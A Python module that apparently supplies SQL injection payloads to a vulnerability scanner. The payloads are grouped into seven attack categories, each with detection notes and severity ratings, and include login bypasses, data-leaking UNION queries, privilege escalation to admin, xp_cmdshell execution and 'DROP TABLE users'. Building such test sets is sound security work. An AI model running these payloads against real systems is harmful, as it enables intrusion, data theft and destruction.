from typing import Final

# ──────────────────────────────────────────────────────────────────────────────
# 1. CLASSIC ERROR-BASED SQLi
#    Goal: trigger a database error that leaks schema/version information.
#    Detected by: error strings in the HTTP response body.
# ──────────────────────────────────────────────────────────────────────────────
CLASSIC_ERROR_BASED: Final[list[str]] = [
    "'",                              # Bare single quote — breaks string context
    "''",                             # Double single quote — escaping probe
    "' OR '1'='1",                   # Classic OR tautology
    "' OR 1=1--",                    # Comment-terminated OR tautology
    "' OR 1=1#",                     # Hash comment (MySQL-specific)
    "1' ORDER BY 1--",               # ORDER BY column count probe
    "1' ORDER BY 100--",             # ORDER BY with large number → error
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # EXTRACTVALUE error leak
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",  # UPDATEXML error
]

# ──────────────────────────────────────────────────────────────────────────────
# 2. UNION-BASED SQLi
#    Goal: append a UNION SELECT to leak data from other tables.
#    Detected by: unexpected columns/values in the response body.
# ──────────────────────────────────────────────────────────────────────────────
UNION_BASED: Final[list[str]] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,user(),version(),database(),5,6,7,8--",  # MySQL info leak
]

# ──────────────────────────────────────────────────────────────────────────────
# 3. BLIND BOOLEAN-BASED SQLi
#    Goal: infer data by comparing true vs. false responses.
#    Detected by: different response body/length for true vs. false conditions.
# ──────────────────────────────────────────────────────────────────────────────
BLIND_BOOLEAN: Final[list[str]] = [
    " AND 1=1--",                    # Always true
    " AND 1=2--",                    # Always false
    " AND 'a'='a'--",               # String tautology
    " AND 'a'='b'--",               # String contradiction
    " AND 1=1#",
    " AND 1=2#",
    " AND SUBSTRING(username,1,1)='a'--",  # Blind char extraction probe
    " AND LENGTH(username)>0--",
    " AND (SELECT COUNT(*) FROM users)>0--",  # Sub-query boolean
    " AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64--",
]

# ──────────────────────────────────────────────────────────────────────────────
# 4. TIME-BASED BLIND SQLi
#    Goal: infer true/false by measuring response latency (SLEEP / WAITFOR).
#    Detected by: response_time_ms ≥ configured threshold (default 3 s).
# ──────────────────────────────────────────────────────────────────────────────
TIME_BASED: Final[list[str]] = [
    "'; SLEEP(5)--",
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "1; SLEEP(5)--",
    "1 AND SLEEP(5)--",
    " AND IF(1=1,SLEEP(5),0)--",
    " AND IF(1=2,SLEEP(5),0)--",    # Should NOT delay (control)
    "; WAITFOR DELAY '0:0:5'--",    # MSSQL syntax — tests for error diff
]

# ──────────────────────────────────────────────────────────────────────────────
# 5. AUTH BYPASS SQLi
#    Goal: authenticate without valid credentials by manipulating the WHERE clause.
#    Detected by: successful authentication response (200 + user object).
# ──────────────────────────────────────────────────────────────────────────────
AUTH_BYPASS: Final[list[str]] = [
    "admin'--",                       # Comment out password check
    "admin'#",                        # MySQL hash comment variant
    "admin'/*",                       # Block comment
    "' OR '1'='1",                   # Tautology in username
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "admin' OR '1'='1'--",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
]

# ──────────────────────────────────────────────────────────────────────────────
# 6. STACKED QUERIES SQLi
#    Goal: inject a second SQL statement after a semicolon.
#    Detected by: successful execution of a second statement or DB state change.
# ──────────────────────────────────────────────────────────────────────────────
STACKED_QUERIES: Final[list[str]] = [
    "'; SELECT 1--",                              # Benign probe
    "'; SELECT user()--",                         # DB user leak
    "'; SELECT version()--",                      # DB version leak
    "'; INSERT INTO sessions(user_id,token) VALUES(1,'SQLI_TEST_TOKEN')--",
    "'; UPDATE users SET role='admin' WHERE username='john_doe'--",
    "'; DROP TABLE IF EXISTS sqli_canary--",       # Canary table drop (safe — table doesn't exist)
]

# ──────────────────────────────────────────────────────────────────────────────
# 7. SECOND-ORDER SQLi
#    Goal: store a payload that gets executed when data is retrieved/used later.
#    These are harder to detect automatically but are included for completeness.
# ──────────────────────────────────────────────────────────────────────────────
SECOND_ORDER: Final[list[str]] = [
    "admin'--",                        # Stored then used in login
    "' OR 1=1--",                     # Stored then used in a search
    "test'; UPDATE users SET role='admin' WHERE '1'='1",
    "'; EXEC xp_cmdshell('whoami')--",  # MSSQL — tests for cross-DB errors
    "\\'; DROP TABLE users; --",        # Backslash-escaped variant
]

# ──────────────────────────────────────────────────────────────────────────────
# Convenience: all payloads grouped by endpoint vulnerability type
# ──────────────────────────────────────────────────────────────────────────────
ALL_PAYLOADS: Final[dict[str, list[str]]] = {
    "classic_error_based": CLASSIC_ERROR_BASED,
    "union_based":         UNION_BASED,
    "blind_boolean":       BLIND_BOOLEAN,
    "time_based":          TIME_BASED,
    "auth_bypass":         AUTH_BYPASS,
    "stacked_queries":     STACKED_QUERIES,
    "second_order":        SECOND_ORDER,
}

# Payload categories with human-readable labels
CATEGORY_LABELS: Final[dict[str, str]] = {
    "classic_error_based": "Classic / Error-Based SQLi",
    "union_based":         "UNION-Based SQLi",
    "blind_boolean":       "Blind Boolean-Based SQLi",
    "time_based":          "Time-Based Blind SQLi",
    "auth_bypass":         "Authentication Bypass SQLi",
    "stacked_queries":     "Stacked Queries SQLi",
    "second_order":        "Second-Order SQLi",
}

# CVSS-like severity per category
CATEGORY_SEVERITY: Final[dict[str, str]] = {
    "classic_error_based": "HIGH",
    "union_based":         "CRITICAL",
    "blind_boolean":       "HIGH",
    "time_based":          "MEDIUM",
    "auth_bypass":         "CRITICAL",
    "stacked_queries":     "CRITICAL",
    "second_order":        "HIGH",
}
